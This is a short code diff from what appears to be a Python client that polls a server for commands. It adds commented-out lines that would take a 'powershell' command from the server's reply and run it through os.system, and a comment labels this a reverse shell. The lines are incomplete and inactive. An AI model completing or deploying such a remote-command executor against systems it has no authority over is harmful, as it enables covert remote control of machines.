@@ -57,6 +57,12 @@ while True:
     rid = get_command.json().get("rid")
     print(f"RID FROM REQUEST FROM SERVER: {str(rid)}")
 
+    #command = get_command.json().get("data").get("powershell")[0]
+
+    #print(command)
+    # shitty rev shell 
+    #os.system()
+
     # do actions
 
     dict_data_response = {
